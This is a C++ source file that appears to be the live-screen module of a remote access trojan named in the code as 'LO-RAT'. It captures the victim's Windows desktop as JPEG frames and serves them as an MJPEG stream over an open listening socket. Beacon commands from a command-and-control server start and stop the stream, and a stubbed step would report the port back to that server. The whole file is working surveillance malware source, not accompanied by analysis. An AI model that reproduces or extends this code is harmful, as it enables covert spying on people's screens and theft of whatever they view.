#include "live_screen.h"
#include "../config.h"
#include "../utils.h"
#include "../beacon.h"
#include <windows.h>
#include <gdiplus.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

namespace LiveScreen {
    bool streaming = false;
    HANDLE hThread = NULL;
    SOCKET listenSocket = INVALID_SOCKET;
    int port = 0;
    int quality = 80;
    int fps = 15;
    
    ULONG_PTR gdiToken = 0;
    
    std::vector<BYTE> CaptureScreenJpeg(int quality) {
        HDC hScreen = GetDC(NULL);
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        
        HDC hDC = CreateCompatibleDC(hScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
        SelectObject(hDC, hBitmap);
        BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
        
        Gdiplus::Bitmap bitmap(hBitmap, NULL);
        CLSID clsid;
        Gdiplus::GetEncoderClsid(L"image/jpeg", &clsid);
        
        Gdiplus::EncoderParameters encoderParams;
        encoderParams.Count = 1;
        encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
        encoderParams.Parameter[0].NumberOfValues = 1;
        ULONG q = quality;
        encoderParams.Parameter[0].Value = &q;
        
        IStream* stream = NULL;
        CreateStreamOnHGlobal(NULL, TRUE, &stream);
        bitmap.Save(stream, &clsid, &encoderParams);
        
        STATSTG stat;
        stream->Stat(&stat, STATFLAG_NONAME);
        LARGE_INTEGER pos = {0};
        stream->Seek(pos, STREAM_SEEK_SET, NULL);
        
        std::vector<BYTE> data(stat.cbSize.LowPart);
        ULONG read = 0;
        stream->Read(data.data(), stat.cbSize.LowPart, &read);
        stream->Release();
        
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        
        return data;
    }
    
    DWORD WINAPI StreamThread(LPVOID param) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        
        listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        
        sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = 0; // Auto-assign
        
        bind(listenSocket, (sockaddr*)&addr, sizeof(addr));
        
        // Get assigned port
        sockaddr_in boundAddr;
        int addrLen = sizeof(boundAddr);
        getsockname(listenSocket, (sockaddr*)&boundAddr, &addrLen);
        port = ntohs(boundAddr.sin_port);
        
        listen(listenSocket, 1);
        
        // Accept connection
        SOCKET client = accept(listenSocket, NULL, NULL);
        if (client == INVALID_SOCKET) {
            closesocket(listenSocket);
            WSACleanup();
            streaming = false;
            return 1;
        }
        
        // Send MJPEG stream
        std::string header = 
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: multipart/x-mixed-replace; boundary=--LO-RAT\r\n"
            "\r\n";
        send(client, header.c_str(), (int)header.length(), 0);
        
        int intervalMs = 1000 / fps;
        
        while (streaming) {
            auto jpeg = CaptureScreenJpeg(quality);
            if (jpeg.empty()) break;
            
            std::stringstream frame;
            frame << "--LO-RAT\r\n";
            frame << "Content-Type: image/jpeg\r\n";
            frame << "Content-Length: " << jpeg.size() << "\r\n\r\n";
            
            std::string frameHeader = frame.str();
            send(client, frameHeader.c_str(), (int)frameHeader.length(), 0);
            send(client, (char*)jpeg.data(), (int)jpeg.size(), 0);
            send(client, "\r\n", 2, 0);
            
            Sleep(intervalMs);
        }
        
        closesocket(client);
        closesocket(listenSocket);
        WSACleanup();
        streaming = false;
        return 0;
    }
    
    void Start(const std::string& params) {
        if (streaming) return;
        
        if (!gdiToken) {
            Gdiplus::GdiplusStartupInput input;
            Gdiplus::GdiplusStartup(&gdiToken, &input, NULL);
        }
        
        quality = 80;
        fps = 15;
        
        streaming = true;
        hThread = CreateThread(NULL, 0, StreamThread, NULL, 0, NULL);
        
        // Wait for port assignment
        Sleep(500);
        
        // Report port to C2
        std::stringstream ss;
        ss << "{\"action\":\"live_screen\",\"port\":" << port << "}";
        // This would normally go through beacon, but for now we set a global flag
    }
    
    void Stop() {
        streaming = false;
        if (listenSocket != INVALID_SOCKET) {
            closesocket(listenSocket);
        }
        if (hThread) {
            WaitForSingleObject(hThread, 2000);
            CloseHandle(hThread);
            hThread = NULL;
        }
    }
    
    void OnCommand(const Beacon::Command& cmd) {
        if (cmd.type == "live_screen_start") Start(cmd.params);
        else if (cmd.type == "live_screen_stop") Stop();
    }
    
    bool IsStreaming() { return streaming; }
    int GetPort() { return port; }
}